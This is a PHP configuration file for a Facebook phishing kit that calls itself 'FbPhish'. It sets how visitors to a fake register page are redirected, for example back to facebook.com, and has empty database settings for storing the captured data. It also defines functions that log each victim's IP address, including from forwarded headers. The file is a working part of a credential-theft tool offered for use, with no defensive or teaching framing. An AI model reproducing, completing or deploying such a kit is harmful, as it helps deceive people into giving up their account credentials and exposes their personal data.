<?
// This is the configuration of the FB phishing tool!
// Here you should define all database connection settings and other stuff
// ALL OPTIONS, EXCEPT DATABASE SETTINGS AND MESSAGES SHOULD BE SET WITH LOWERCASE LETTERS OR/AND NUMBERS


// FbPhish settings

// Config option 287:
//  TRUE: Redirect to facebook.com when poeple come on the register.php but did not submitted the form
//  FALSE: Do not redirect when poeple com on register.php but did not submitted the register form on index.ph
//  HOME: Redirect to /index.php when poeple are on register.php but did not submitted the register form
//  NOT TRUE OR FALSE: If this is not "true" the poeple will be redirected to the entered link(example: if you put in https://google.com in config_option_287 you  will be redirected to google when you get on register.php when you did not submitted the form!)
$config_option__287 = "true";


// Database settings
$fbphish_sql_host = "";
$fbphish_sql_user = "";
$fbphish_sql_password = "";
$fbphish_sql_db = "";


// DO NOT TOUCH
// Defining global functions
function getIp() {
	$ip = $_SERVER['REMOTE_ADDR'];
	return $ip;
}

function getMetaIp() {
    $metaIp = $_SERVER['REMOTE_ADDR'];
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $metaIp = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $metaIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
 
    return $metaIp;
}
